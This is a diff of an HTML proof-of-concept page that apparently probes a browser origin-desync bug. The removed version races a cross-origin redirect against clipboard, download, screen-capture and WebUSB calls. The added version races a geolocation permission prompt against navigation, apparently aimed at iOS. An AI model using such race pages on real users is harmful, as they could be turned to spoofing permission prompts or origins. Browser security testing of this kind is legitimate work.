@@ -1,97 +1,49 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <body style="background:#111;color:#fff;text-align:center;font-family:sans-serif">
 
-<h2>Activation Leak + Origin Desync (NO FULLSCREEN)</h2>
-<p>Click Start → redirect race → test activation-sensitive APIs</p>
+<h2>iOS UI Persistence / Origin Desync PoC</h2>
+<p>Tap Start → permission race → redirect</p>
 
-<button id="start" style="font-size:22px;padding:12px 24px">
-  Start
-</button>
+<button id="start" style="font-size:22px;padding:14px 26px">Start</button>
 
-<pre id="log" style="text-align:left;margin:20px auto;width:85%;
-background:#000;padding:16px;border-radius:8px;max-width:900px;overflow:auto"></pre>
+<pre id="log" style="margin:20px auto;width:85%;background:#000;padding:14px;border-radius:8px;text-align:left"></pre>
 
 <script>
-const log = msg => {
-  console.log("[PoC]", msg);
-  out.textContent += msg + "\n";
-};
+const log = m => out.textContent += m + "\n";
 const out = document.getElementById("log");
 
-// ------------------------------------------------
-// ENV
-// ------------------------------------------------
 log("Origin: " + location.origin);
-log("UA: " + navigator.userAgent);
-log("-----------------------------------");
+log("--------------------------------");
 
-// ------------------------------------------------
-// USER GESTURE
-// ------------------------------------------------
 start.onclick = async () => {
-  log("[STEP] User clicked button → activation created");
+  log("[STEP] User activation");
 
-  // --------------------------------------------
-  // RACE: redirect to DIFFERENT origin
-  // --------------------------------------------
+  // 1️⃣ Start permission request
+  try {
+    navigator.geolocation.getCurrentPosition(
+      () => log("[INFO] Geo success"),
+      () => log("[INFO] Geo denied")
+    );
+    log("[STEP] Geolocation requested");
+  } catch {}
+
+  // 2️⃣ Lifecycle / navigation race
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        log("[RACE] Redirecting to https://google.com:9090");
+        log("[RACE] Navigating to https://google.com:9090");
         location.href = "https://google.com:9090";
-      }, 60);
+      }, 80);
     });
   });
-
-  // --------------------------------------------
-  // ACTIVATION TESTS (SHOULD FAIL)
-  // --------------------------------------------
-  log("[TEST] Testing activation leakage…");
-
-  // Clipboard
-  try {
-    await navigator.clipboard.writeText("ACTIVATION_LEAK");
-    log("[BUG] Clipboard write SUCCESS ❌");
-  } catch (e) {
-    log("[OK] Clipboard blocked ✔");
-  }
-
-  // Programmatic download
-  try {
-    const b = new Blob(["TEST"], { type:"text/plain" });
-    const u = URL.createObjectURL(b);
-    const a = document.createElement("a");
-    a.href = u;
-    a.download = "activation-test.exe";
-    a.click();
-    log("[BUG] Programmatic download SUCCESS ❌");
-  } catch {
-    log("[OK] Download blocked ✔");
-  }
-
-  // Screen capture
-  if (navigator.mediaDevices?.getDisplayMedia) {
-    try {
-      await navigator.mediaDevices.getDisplayMedia({ video:true });
-      log("[BUG] getDisplayMedia PROMPTED ❌");
-    } catch {
-      log("[OK] getDisplayMedia blocked ✔");
-    }
-  }
-
-  // WebUSB
-  if (navigator.usb) {
-    try {
-      await navigator.usb.requestDevice({ filters:[] });
-      log("[BUG] WebUSB requestDevice SUCCESS ❌");
-    } catch {
-      log("[OK] WebUSB blocked ✔");
-    }
-  }
-
-  log("\n[DONE] Any ❌ means ACTIVATION LEAK + ORIGIN DESYNC");
 };
+
+// Observe lifecycle
+addEventListener("pagehide", () => log("[EVENT] pagehide"));
+addEventListener("visibilitychange", () =>
+  log("[EVENT] visibility=" + document.visibilityState)
+);
 </script>
 
 </body>
